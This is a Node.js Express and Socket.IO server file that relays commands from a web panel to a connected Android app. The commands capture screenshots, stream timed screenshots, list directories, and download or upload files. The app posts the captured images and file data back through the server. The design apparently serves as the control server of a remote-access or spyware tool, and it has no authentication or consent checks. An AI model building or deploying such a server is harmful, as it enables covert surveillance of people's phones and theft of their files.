const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();

// Set huge limits for HTTP API uploads
app.use(express.json({ limit: '500mb' }));
app.use(express.urlencoded({ limit: '500mb', extended: true }));

const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// ==========================================
// 🚀 REST API ROUTES (DATA UPLOAD FROM APP)
// ==========================================

// App uploads screenshot here
app.post('/api/screenshot', (req, res) => {
    // Send it to the web panel immediately
    io.emit('receive_screenshot', { image: req.body.image });
    res.status(200).send({ success: true });
});

// App uploads directory list here
app.post('/api/directory', (req, res) => {
    io.emit('receive_directory_list', req.body);
    res.status(200).send({ success: true });
});

// App uploads downloaded file data here
app.post('/api/file-data', (req, res) => {
    io.emit('receive_file_data', req.body);
    res.status(200).send({ success: true });
});

// ==========================================
// 🔌 SOCKET.IO (COMMANDS ONLY)
// ==========================================

io.on('connection', (socket) => {
    
    // Identify who is connecting (Web or App)
    socket.on('register_device', (role) => {
        socket.role = role;
        if(role === 'app') console.log('📱 ANDROID APP CONNECTED!');
        if(role === 'web') console.log('💻 WEB PANEL CONNECTED!');
    });

    socket.on('app_debug_log', (msg) => {
        console.log(`🛠️ [APP LOG]:`, msg);
    });

    // Web Panel Commands to App
    socket.on('request_single_shot', () => socket.broadcast.emit('command_single_shot'));
    socket.on('request_timer_stream', (data) => socket.broadcast.emit('command_timer_stream', data));
    socket.on('request_directory', (dirPath) => socket.broadcast.emit('command_get_directory', dirPath));
    socket.on('request_download_file', (filePath) => socket.broadcast.emit('command_download_file', filePath));
    socket.on('request_upload_file', (uploadData) => socket.broadcast.emit('command_upload_file', uploadData));

    socket.on('disconnect', () => {
        console.log(`🔴 ${socket.role ? socket.role.toUpperCase() : 'UNKNOWN'} Disconnected.`);
    });
});

const PORT = process.env.PORT || 8080;
server.listen(PORT, () => console.log(`Hybrid API Server running on port ${PORT}`));
